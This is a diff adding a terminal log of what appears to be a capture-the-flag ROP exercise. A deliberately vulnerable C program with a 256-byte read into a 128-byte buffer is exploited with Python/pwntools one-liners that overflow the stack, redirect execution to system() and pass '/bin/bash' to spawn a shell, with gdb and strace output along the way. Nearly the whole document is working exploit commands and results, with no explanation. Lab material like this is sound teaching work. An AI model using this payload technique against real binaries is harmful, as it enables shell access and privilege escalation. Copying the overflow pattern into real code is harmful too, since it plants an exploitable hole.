@@ -1,0 +1,61 @@
+root@kali32:~$ cat rop2-20f65dd0bcbe267d.c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char * not_used = "/bin/bash";
+
+int not_called() {
+        return system("/bin/date");
+}
+
+void vulnerable_function() {
+        char buf[128];
+        read(STDIN_FILENO, buf, 256);
+}
+
+void be_nice_to_people() {
+        // /bin/sh is usually symlinked to bash, which usually drops privs. Make
+        // sure we don't drop privs if we exec bash, (ie if we call system()).
+        gid_t gid = getegid();
+        setresgid(gid, gid, gid);
+}
+
+int main(int argc, char** argv) {
+        be_nice_to_people();
+        vulnerable_function();
+        write(STDOUT_FILENO, "Hello, World\n", 13);
+}
+
+gdb-peda$ pdisass not_called
+Dump of assembler code for function not_called:
+   0x080484a4 <+0>:     push   ebp
+   0x080484a5 <+1>:     mov    ebp,esp
+   0x080484a7 <+3>:     sub    esp,0x18
+   0x080484aa <+6>:     mov    DWORD PTR [esp],0x804861a
+   0x080484b1 <+13>:    call   0x80483a0 <system@plt>
+   0x080484b6 <+18>:    leave
+   0x080484b7 <+19>:    ret
+End of assembler dump.
+
+root@kali32:~$ python -c 'from pwn import *; print "A" * 140 + p32(0x080484b1) + "XXXX"' | strace -f -e execve ./rop2-20f65dd0bcbe267d
+execve("./rop2-20f65dd0bcbe267d", ["./rop2-20f65dd0bcbe267d"], [/* 33 vars */]) = 0
+Process 6536 attached
+[pid  6536] execve("/bin/sh", ["sh", "-c", 0x58585858], [/* 33 vars */]) = -1 EFAULT (Bad address)
+[pid  6536] +++ exited with 127 +++
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=6536, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
++++ killed by SIGSEGV +++
+Segmentation fault
+
+root@kali32:~/ROP$ nm rop2-20f65dd0bcbe267d | grep not_used
+0804a024 D not_used
+
+gdb-peda$ x /xw 0x0804a024
+0x804a024 <not_used>:   0x08048610
+
+gdb-peda$ x /xs 0x08048610
+0x8048610:      "/bin/bash"
+
+root@kali32:~$ (python -c 'from pwn import *; print "A" * 140 + p32(0x080484b1) + p32(0x8048610)'; cat -) | ./rop2-20f65dd0bcbe267d
